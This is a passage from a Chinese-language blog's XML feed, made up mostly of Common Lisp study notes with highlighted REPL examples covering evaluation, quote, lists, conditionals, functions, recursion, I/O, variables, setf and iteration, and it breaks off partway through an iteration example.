          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Common Lisp 教程</title>
      <link href="/Blog/2022/04/24/lisp/CommonLisp%E6%95%99%E7%A8%8B/index/"/>
      <url>/Blog/2022/04/24/lisp/CommonLisp%E6%95%99%E7%A8%8B/index/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.learnfk.com/lisp/lisp-overview.html">https://www.learnfk.com/lisp/lisp-overview.html</a></p><p><a href="https://acl.readthedocs.io/en/latest/index.html">https://acl.readthedocs.io/en/latest/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Lisp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonLisp学习笔记一</title>
      <link href="/Blog/2022/04/24/lisp/CommonLisp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/index/"/>
      <url>/Blog/2022/04/24/lisp/CommonLisp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/index/</url>
      
        <content type="html"><![CDATA[<h1 id="范式-form"><a href="#范式-form" class="headerlink" title="范式(form)"></a>范式(form)</h1><p>任何 Lisp系统都包含一个叫做顶层(toplevel)的交互式前端，你在顶层中输入Lisp表达式,系统打印它们的值。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>系统会打印它的值,跟着另一个提示符,表示它在等待更多的输入. 在这种情况下,打印出来的值和我们输入的一样. 象1这样的数叫做自身求值的</p><p>当我们输入一个需要做些求值工作的表达式时</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">+</span> <span class="number">2</span> <span class="number">3</span>)</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><blockquote><p>在表达式(+ 2 3)中,+叫做操作符,数2和3叫做变元<br>Lisp中我们把+写 在最前面,后面跟着变元,整个表达式被一对括号围住:(+ 2 3). 因为操作 符在前,这叫做<strong>前缀表示法</strong><br>一开始这样写表达式有点怪,我们想把三个数加起来,用通常的表示法我们要写+两次 <code>2 + 3 + 4</code>,而在Lisp中我们仅需增加一个变元: <code>(+ 2 3 4)</code></p></blockquote><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">/</span> (<span class="name">-</span> <span class="number">7</span> <span class="number">1</span>) (<span class="name">-</span> <span class="number">4</span> <span class="number">2</span>))</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h1 id="求值"><a href="#求值" class="headerlink" title="求值"></a>求值</h1><p>在Lisp中,+是一个函数,形如(+ 2 3)的表达式是函数调用. 当Lisp对函数调用求 值时,它做这样两步:</p><ol><li>首先变元从左至右被求值. 在此例中,每个变元求值到自身,所以变元的值 分别是2和3.</li><li>变元的值传给以操作符命名的函数. 在此例中,即+函数,它返回5.</li></ol><p>如果任何变元本身是函数调用,它们按上述规则求值. 这是对(&#x2F; (- 7 1) (- 4 2))求值时发生的情况:</p><ol><li>Lisp计算(- 7 1): 7求值为7,1求值为1. 它们被传给函数-,它返回6.</li><li>Lisp计算(- 4 2): 4求值为4,2求值为2. 它们被传给函数-,它返回2.</li><li>6和2的值传给函数&#x2F;,它返回3.</li></ol><blockquote><p>并不是所有的Lisp操作符都是函数,但大多数都是. 而函数总是按这种方式求值 的. 变元从左至右被求值,它们的值被传给函数,函数返回整个表达式的值. 这叫做Common Lisp的求值规则.一个不遵守上述规则的操作符是quote</p></blockquote><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">quote</span> (+ <span class="number">3</span> <span class="number">5</span>))</span><br><span class="line">(<span class="name">+</span> <span class="number">3</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>为了方便,Common Lisp定义’作为quote的简记法. 通过在任何表达式前面加上’ 你能获得与调用quote同样的效果:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#x27;(+ <span class="number">3</span> <span class="number">5</span>)</span><br><span class="line">(<span class="name">+</span> <span class="number">3</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>用简记法比用quote普遍得多. Lisp提供quote作为一种保护表达式以防被求值的手段</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;; 从麻烦中解脱出来 如果你输入了一些Lisp不能理解的东西,它会打印一条出错信息并把你带到一个 叫中断循环(break loop)的顶层中去. 中断循环给了有经验的程序员弄清出错原 因的机会,不过一开始你唯一需要知道的事是如何从中断循环中出来. 如何返回 顶层取决于你用的Lisp环境. 在这个假设的环境里,用:abort出来:</span></span><br><span class="line">&gt; (<span class="name">/</span> <span class="number">1</span> <span class="number">0</span>)</span><br><span class="line">Error: Division by zero.</span><br><span class="line">       Options: :abort, :backtrace</span><br><span class="line">&gt;&gt; :abort</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h1 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h1><p>Lisp提供在其它语言中找得到的数据类型，一是整数,另一种和其它语言一样有的是字符串,整数 和字符串都求值到自身. 另两种我们不常在其它语言中发现的是符号和表. 符号是单词. 通常它们被转换成大写,不管你如何输入</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#x27;Artichoke</span><br><span class="line">ARTICHOKE</span><br></pre></td></tr></table></figure><p>符号(通常)不求值为自身,因此如果你想引用一个符号,请象上面那样用<code>&#39;</code>引用它. 表表示为被括号包围的零个或多个元素. 元素可以是任何类型,包括表. 你必须引用表,否则Lisp会以为它是函数调用:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#x27;(my <span class="number">3</span> <span class="string">&quot;Sons&quot;</span>)</span><br><span class="line">(<span class="name">MY</span> <span class="number">3</span> <span class="string">&quot;Sons&quot;</span>)</span><br><span class="line">&gt; &#x27;(the list (a b c) has <span class="number">3</span> elements)</span><br><span class="line">(<span class="name">THE</span> LIST (<span class="name">A</span> B C) HAS <span class="number">3</span> ELEMENTS)</span><br></pre></td></tr></table></figure><p>请注意一个引号保护整个表达式,包括里面的表达式. 你可以调用list来构造表. 因为list是一个函数,它的变元被求值. 这是+调用在 list调用里的例子:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">list</span> &#x27;my (<span class="name">+</span> <span class="number">2</span> <span class="number">1</span>) <span class="string">&quot;Sons&quot;</span>)</span><br><span class="line">(<span class="name">MY</span> <span class="number">3</span> <span class="string">&quot;Sons&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>现在我们处于欣赏Lisp最非同寻常特征之一的位置上. Lisp程序表达为表.</p></blockquote><p>Lisp程序表达为表. 如果变元的机动性和优雅性没能说服你Lisp记号是一种有价值的工具,这点应该能使你信服. 这意味着<strong>Lisp程序可以生成Lisp代码</strong>. Lisp程序员能(而且经常)为自己编写能写程序的程序.<br>在现阶段理解表达式和表的关系也是很重 要的,而不是被它们弄糊涂. 这就是为何我们使用quote. 如果一个表被引用了, 求值返回它本身; 如果没有被引用,它被认为是代码,求值返回它的值:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">list</span> &#x27;(+ <span class="number">2</span> <span class="number">1</span>) (<span class="name">+</span> <span class="number">2</span> <span class="number">1</span>))</span><br><span class="line">((<span class="name">+</span> <span class="number">2</span> <span class="number">1</span>) <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>此处第一个变元被引用了,所以生成了一个表. 第二个变元没有被引用,视之为函 数调用,得出一个数字. 在Common Lisp中有两种方法表示空表. 你可用一对不包含任何东西的括号来表 示空表,或用符号nil来表示它. 你用哪种方法表示空表都没有关系,不过它会被 显示成nil:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; ()</span><br><span class="line">NIL</span><br><span class="line">&gt; <span class="literal">nil</span></span><br><span class="line">NIL</span><br></pre></td></tr></table></figure><h1 id="表的操作"><a href="#表的操作" class="headerlink" title="表的操作"></a>表的操作</h1><p>函数cons构造表. 如果它的第二个变元是表,它返回一个新表,新表的第一个元素 就是第一个变元:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">cons</span> &#x27;a &#x27;(b c d))</span><br><span class="line">(<span class="name">A</span> B C D)</span><br></pre></td></tr></table></figure><p>我们可以通过把新元素cons到空表来构造新表. 我们在上一节见到的list函数只不过是一个把几样东西cons到nil上去的方便办法:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">cons</span> &#x27;a (<span class="name">cons</span> &#x27;b <span class="literal">nil</span>)) // &gt; (<span class="name">cons</span> &#x27;a &#x27;b)</span><br><span class="line">(<span class="name">A</span> B) // (<span class="name">A</span> . B)</span><br><span class="line">&gt; (<span class="name">list</span> &#x27;a &#x27;b)</span><br><span class="line">(<span class="name">A</span> B)</span><br></pre></td></tr></table></figure><p>基本的提取表中元素的函数是car和cdr表的car就是它的第一个元素,而 cdr是第一个元素后面的所有东西:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">car</span> &#x27;(a b c))</span><br><span class="line">A</span><br><span class="line">&gt; (<span class="name">cdr</span> &#x27;(a b c))</span><br><span class="line">(<span class="name">B</span> C)</span><br><span class="line">&gt; (<span class="name">car</span> (<span class="name">cdr</span> (<span class="name">cdr</span> &#x27;(a b c d))))</span><br><span class="line">C</span><br><span class="line"><span class="comment">;; 但是,你可以用third更容易地做同样的事:</span></span><br><span class="line">&gt; (<span class="name">third</span> &#x27;(a b c d))</span><br><span class="line">C</span><br></pre></td></tr></table></figure><h1 id="真值"><a href="#真值" class="headerlink" title="真值"></a>真值</h1><p>符号t是Common Lisp中表示真的缺省值. 就象nil,t求值到自身. 函数listp返回 真如果它的变元是一个表:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">listp</span> &#x27;(a b c))</span><br><span class="line">T</span><br></pre></td></tr></table></figure><p><strong>一个函数叫做断言如果它的返回值被解释成真或假</strong>. Common Lisp的断言的名字通常以p结尾. 假在Common Lisp中用nil(空表)来表示. 如果我们传给listp的变元不是表,它返回nil:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">listp</span> <span class="number">27</span>)</span><br><span class="line">NIL</span><br></pre></td></tr></table></figure><p>因为nil扮演两个角色,函数null返回真如果它的变元是空表:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">null</span> <span class="literal">nil</span>)</span><br><span class="line">T</span><br></pre></td></tr></table></figure><p>而函数not返回真如果它的变元是假:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">not</span> <span class="literal">nil</span>)</span><br><span class="line">T</span><br></pre></td></tr></table></figure><p>它们完全做的是同样的事情. 要if是Common Lisp中最简单的条件语句. 它一般接受三个变元:一个测试表达式, 一个then表达式和一个else表达式</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">if</span> (<span class="name">listp</span> &#x27;(a b c))</span><br><span class="line">      (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span>)</span><br><span class="line">      (<span class="name">+</span> <span class="number">5</span> <span class="number">6</span>)</span><br><span class="line">    )</span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt; (<span class="name">if</span> (<span class="name">listp</span> <span class="number">27</span>)</span><br><span class="line">      (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span>)</span><br><span class="line">      (<span class="name">+</span> <span class="number">5</span> <span class="number">6</span>)</span><br><span class="line">   )</span><br><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure><p>就象quote,if是特殊操作符. 它不能用函数来实现,因为函数调用的变元总是要 求值的,而if的特点是只有最后两个变元中的一个被求值. if的最后一个变元是可选的. 如果你省略它,它缺省为nil:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">if</span> (<span class="name">listp</span> <span class="number">27</span>) </span><br><span class="line">      (<span class="name">+</span> <span class="number">2</span> <span class="number">3</span>))</span><br><span class="line">NIL</span><br></pre></td></tr></table></figure><p>虽然t是真的缺省表示,任何不是nil的东西在逻辑上下文中被认为是真:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">if</span> <span class="number">27</span> <span class="number">1</span> <span class="number">2</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>逻辑操作符and和or就象条件语句. 两者都接受任意数目的变元,但只求值能够确定返回值的数目的变元. 如果所有的变元都是真(不是nil),那么and返回最后变元的值:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">and</span> <span class="literal">t</span> (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span>))</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p>但如果其中一个变元是假,所有它后面的变元都不求值了. or也类似,只要它碰到一个是真的变元就继续求值了. <strong>这两个操作符是宏</strong>. 就象特殊操作符,宏可以规避通常的求值规则</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>你可以用defun来定义新的函数. 它通常接受三个以上变元:一个名字,一列参数, 和组成函数体的一个或多个表达式. 这是我们定义third的一种可能:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">defun</span> our-third (<span class="name">x</span>)</span><br><span class="line">    (<span class="name">car</span> (<span class="name">cdr</span> (<span class="name">cdr</span> x))))</span><br><span class="line">OUR-THIRD</span><br><span class="line"></span><br><span class="line">&gt; (<span class="name">our-third</span> &#x27;(a b c d))</span><br><span class="line">C</span><br></pre></td></tr></table></figure><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">defun</span> sum-greater (<span class="name">x</span> y z)</span><br><span class="line">    (<span class="name">&gt;</span> (<span class="name">+</span> x y) z))</span><br><span class="line">SUM-GREATER</span><br><span class="line">&gt; (<span class="name">sum-greater</span> <span class="number">1</span> <span class="number">4</span> <span class="number">3</span>)</span><br><span class="line">T</span><br></pre></td></tr></table></figure><p>Lisp对程序,过程或函数不加区别. 函数做了所有的事情(事实上构成了语言本身 的大部分). 你可以认为你的函数中的一个是主函数,但通常你能在顶层里调用任 何一个函数. 这意味着,当你写程序的时候,你能一小段一小段地测试它们.</p><h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><p>我们在上一节中定义的函数还调用了其它函数为自己服务. 比如sum-greater调 用了+和&gt;. <strong>函数可以调用任何函数,包括它本身</strong>. 自己调用自己的函数是递归的.</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> our-member (<span class="name">obj</span> lst)</span><br><span class="line">  (<span class="name">if</span> (<span class="name">null</span> lst)</span><br><span class="line">      <span class="literal">nil</span></span><br><span class="line">      (<span class="name">if</span> (<span class="name">eql</span> (<span class="name">car</span> lst) obj)</span><br><span class="line">          lst</span><br><span class="line">          (<span class="name">our-member</span> obj (<span class="name">cdr</span> lst)))))</span><br><span class="line"></span><br><span class="line">&gt; (<span class="name">our-member</span> &#x27;b &#x27;(a b c))</span><br><span class="line">(<span class="name">B</span> C)</span><br><span class="line">&gt; (<span class="name">our-member</span> &#x27;z &#x27;(a b c))</span><br><span class="line">NIL</span><br></pre></td></tr></table></figure><h1 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h1><p>到目前为止,我们一直在利用顶层暗中使用i&#x2F;o. 对实际的交互式的程序,这可能还不够.<br>我们看一些输入输出函数. Common Lisp中最一般的输出函数是format. 它接受两个以上变元:第一个表示输出到哪儿,第二个是字符串模板,剩下的变元通常是对象,它们的打印表示 (printed representation)将被插入到模板中去. 这是个典型的例子:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~A plus ~A equals ~A.~%&quot;</span> <span class="number">2</span> <span class="number">3</span> (<span class="name">+</span> <span class="number">2</span> <span class="number">3</span>))</span><br><span class="line"><span class="number">2</span> plus <span class="number">3</span> equals <span class="number">5</span>.</span><br><span class="line">NIL</span><br></pre></td></tr></table></figure><p>注意两样东西打印在这儿. 第一行是format打印的. 第二行是format调用的返回值<br>在它里面,每个  A*表示一个将被填充的位置, 而 %表示新行符. 这些位置依次被后面的变元的值填充.<br>标准的输入函数是read. 当没有变元时,它从缺省的地方–通常是顶层–读入. 下面这个函数提示用户输入,然后返回任何输入的东西:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> askem (<span class="name">string</span>)</span><br><span class="line">  (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~A&quot;</span> string)</span><br><span class="line">  (<span class="name">read</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">;; 它运行如下:</span></span><br><span class="line">&gt; (<span class="name">askem</span> <span class="string">&quot;How old are you? &quot;</span>)</span><br><span class="line">How old are you? <span class="number">29</span></span><br><span class="line"><span class="number">29</span></span><br></pre></td></tr></table></figure><p>请记住read会永远等在那儿直到你输入什么东西并(通常要)敲入回车. 因此调用 read而不打印明确的提示信息是不明智的,否则你的程序会给人以已经死掉的印象,但实际上它在等待输入.<br>第二个要了解read的是它非常强大:它是一个完整的Lisp语法分析器. 它<strong>并不是读入字符再把它们当作字符串返回</strong>. 它分析所读到的东西,并返回所产生的Lisp 对象.</p><p>在上例中, 它返回一个数. askem虽然很短,<strong>但它展示了一些我们以前在函数定义中没有看到的内容</strong>. 它的函数体包含多个表达式. 函数体可以包含任意多个表达式,当函数被调用时,它们依次被求值,函数会返回最后一个表达式的值. 在以前的章节中,我们坚持所谓的&#96;&#96;纯粹’’的Lisp–即没有副作用的Lisp. <strong>副作用是指作为表达式求值的后果改变了外部世界的状态</strong>. 当我们对一个纯粹的Lisp 表达式,例如(+ 1 2)求值,没有出现副作用;它仅返回一个值. 但当我们调用 format,它不仅返回值,还打印了一些东西. <strong>这是一种副作用</strong>.</p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>局部变量</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">let</span> ((<span class="name">x</span> <span class="number">1</span>) (<span class="name">y</span> <span class="number">2</span>))</span><br><span class="line">    (<span class="name">+</span> x y))</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p>一个let表达式有两部分. 第一部分是一列创造新变量的指令,每个形如(变量 表达式).<br>最后一个表达式的值作为let的值被返回.</p><p>下面是一个使用let 的更具选择性的askem的版本:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> ask-number ()</span><br><span class="line">  (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;Please enter a number. &quot;</span>)</span><br><span class="line">  (<span class="name">let</span> ((<span class="name">val</span> (<span class="name">read</span>)))</span><br><span class="line">    (<span class="name">if</span> (<span class="name">numberp</span> val)</span><br><span class="line">        val</span><br><span class="line">        (<span class="name">ask-number</span>))))</span><br></pre></td></tr></table></figure><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">ask-number</span>)</span><br><span class="line">Please enter a number. a</span><br><span class="line">Please enter a number. (<span class="name">ho</span> hum)</span><br><span class="line">Please enter a number. <span class="number">52</span></span><br><span class="line"><span class="number">52</span></span><br></pre></td></tr></table></figure><p>构造全局变量(习惯上全局变量的名字以星号开始和结束)</p><p>通过传给defparameter一个符号和一个值</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">defparameter</span> *glob* <span class="number">99</span>)</span><br><span class="line">*GLOB*</span><br></pre></td></tr></table></figure><p>还可以用defconstant定义全局常数</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defconstant</span> limit (<span class="name"><span class="built_in">+</span></span> *glob* <span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>判断当前是否存在全局变量或常数的名字,请用boundp</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; (boundp &#x27;<span class="emphasis">*glob*</span>)</span></span><br><span class="line">T</span><br></pre></td></tr></table></figure><h1 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h1><p>Common Lisp中最普通的赋值操作符是setf. 我们可以用它对全局或局部变量进 行赋值:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">setf</span> *glob* <span class="number">98</span>)</span><br><span class="line"><span class="number">98</span></span><br><span class="line">&gt; (<span class="name">let</span> ((<span class="name">n</span> <span class="number">10</span>))</span><br><span class="line">    (<span class="name">setf</span> n <span class="number">2</span>)</span><br><span class="line">    n)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>如果第一个自变量不是局部变量的名字,它被认为是全局变量:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">setf</span> x (<span class="name">list</span> &#x27;a &#x27;b &#x27;c))</span><br><span class="line">(<span class="name">A</span> B C)</span><br></pre></td></tr></table></figure><p>即你可以通过赋值隐含地新建全局变量.不过在源文件中明确地使用 defparameter是较好的风格.<br>你能做的远不止给变量赋值. setf的第一个自变量不但可以是变量名,还可以是 表达式. 在这种情况下,第二个自变量的值被插入到第一个所涉及到的位置:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">setf</span> (<span class="name">car</span> x) &#x27;n) </span><br><span class="line">N</span><br><span class="line">&gt; x</span><br><span class="line">(<span class="name">N</span> B C)</span><br></pre></td></tr></table></figure><p>setf的第一个自变量几乎可以是任何涉及特定位置的表达式. 所有这样的操作符在 附录D中都被标记为&#96;&#96;settable’’. 你可以给setf偶数个自变量. 形如</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">setf</span> a b </span><br><span class="line">      c d </span><br><span class="line">      e f)</span><br></pre></td></tr></table></figure><p>的表达式相当于连续三个单独的setf调用:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">setf</span> a b)</span><br><span class="line">(<span class="name">setf</span> c d)</span><br><span class="line">(<span class="name">setf</span> e f)</span><br></pre></td></tr></table></figure><h1 id="函数化编程法"><a href="#函数化编程法" class="headerlink" title="函数化编程法"></a>函数化编程法</h1><p>函数化编程法的意思是编写通过返回值来工作的程序,而不是修改什么东西.</p><p>它是 Lisp中占支配地位的范例. 大多数Lisp内置函数被调用是为了得到它们的返回值, 而不是它们的副作用.</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">setf</span> lst &#x27;(c a r a t))</span><br><span class="line">(<span class="name">C</span> A R A T)</span><br><span class="line">&gt; (<span class="name">remove</span> &#x27;a lst)</span><br><span class="line">(<span class="name">C</span> R T)</span><br></pre></td></tr></table></figure><p>为什么不说remove从表中删除一个对象? 因为这不是它所做的事情. 原来的表没 有被改变:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; lst</span><br><span class="line">(<span class="name">C</span> A R A T)</span><br></pre></td></tr></table></figure><p>那么如果你真想从表中删掉一些元素怎么办? 在Lisp中,你通常这样做类似的事 情:把表传给某个函数,然后用setf来处理返回值. 为了把所有的a从表x中删掉, 我们这样做:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">setf</span> x (<span class="name">remove</span> &#x27;a x))</span><br></pre></td></tr></table></figure><p>函数化编程法本质上意味着避免使用诸如setf的函数.<br>完全不利用副作用是有困难的. 但随着学习的深入,你会惊讶地发现真正需要副 作用的地方极少. 你使用副作用越少,你也就越进步.</p><blockquote><p>函数化编程最重要的优点之一是它允许交互式测试. 在纯粹的函数化代码中,当你写函数的时候就可以测试它们. 如果它返回期望的值,你可以肯定它是正确的.</p></blockquote><h1 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h1><p>当我们想做一些重复的事情时,用迭代比用递归更自然些.</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> show-squares (<span class="name">start</span> end)</span><br><span class="line">  (<span class="name">do</span> ((<span class="name">i</span> start (<span class="name">+</span> i <span class="number">1</span>)))</span><br><span class="line">      ((<span class="name">&gt;</span> i end) &#x27;done)</span><br><span class="line">    (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~A ~A~%&quot;</span> i (<span class="name">*</span> i i))))</span><br></pre></td></tr></table></figure><p>打印从start到end之间的整数的平方:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">show-squares</span> <span class="number">2</span> <span class="number">5</span>)</span><br><span class="line"><span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">9</span> </span><br><span class="line"><span class="number">4</span> <span 